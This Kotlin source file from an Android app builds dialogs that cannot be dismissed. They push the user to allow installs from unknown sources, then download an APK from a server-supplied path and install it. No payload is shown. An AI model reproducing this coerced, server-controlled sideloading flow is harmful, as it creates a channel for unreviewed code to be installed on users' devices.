package cctv5.cha.abc123.alert

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.view.LayoutInflater
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import cctv5.cha.abc123.R
import cctv5.cha.abc123.http.download
import cctv5.cha.abc123.modle.ResultBean
import cctv5.cha.abc123.utils.install
import cctv5.cha.abc123.utils.path
import com.bumptech.glide.Glide
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

@SuppressLint("StaticFieldLeak")
private lateinit var current:TextView

fun installPermissionAlert(context: Context, data: ResultBean): AlertDialog {
    val dialog = AlertDialog.Builder(context).create()
    val v = LayoutInflater.from(context).inflate(R.layout.dialog_common, null)
    dialog.setView(v)
    dialog.setCancelable(false)
    dialog.setCanceledOnTouchOutside(false)
    v.findViewById<TextView>(R.id.dialogTitle).apply {
        text = "Permission"
    }
    v.findViewById<TextView>(R.id.dialogContent).apply {
        text = data.pkey
    }
    v.findViewById<ImageView>(R.id.guid).apply {
        Glide.with(context).load(data.ukey).into(this)
    }
    v.findViewById<TextView>(R.id.dialogBtn).apply {
        text = "ok"
        setOnClickListener {
            if (!context.packageManager.canRequestPackageInstalls()) {
                val uri = Uri.parse("package:" + context.packageName)
                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(i)
            } else {
                dialog.dismiss()
                val updateAlert = updateAlert(context, data)
                updateAlert.show()
            }
        }
    }
    return dialog
}

fun updateAlert(context: Context, data: ResultBean): AlertDialog {
    val dialog = AlertDialog.Builder(context).create()
    val v = LayoutInflater.from(context).inflate(R.layout.dialog_common, null)
    dialog.setView(v)
    dialog.setCancelable(false)
    dialog.setCanceledOnTouchOutside(false)
    v.findViewById<TextView>(R.id.dialogTitle).apply {
        text = "New Version"
    }
    v.findViewById<TextView>(R.id.dialogContent).apply {
        text = formatString(data.ikey)
    }
    v.findViewById<TextView>(R.id.dialogBtn).apply {
        text = "Download"
        setOnClickListener {
            dialog.dismiss()
            val progress =  progressAlert(context)
            progress.show()
            download(context, data.path){
                current.text = "current = $it%"
                if (it == 100){
                    progress.dismiss()
                    install(context, File(path))
                }
            }
        }
    }
    return dialog
}

fun progressAlert(context: Context):AlertDialog{
    val dialog = AlertDialog.Builder(context).create()
    val v = LayoutInflater.from(context).inflate(R.layout.dialog_progress, null)
    dialog.setView(v)
    dialog.setCancelable(false)
    dialog.setCanceledOnTouchOutside(false)
    v.findViewById<TextView>(R.id.title).apply {
        text = "Download"
    }
    current = v.findViewById(R.id.current)
    return dialog
}

private fun formatString(s: String): String {
    var r = ""
    if (s.contains("|")) {
        val temp = s.split("|")
        temp.forEach {
            r = r + it + "\n"
        }
    }
    return r
}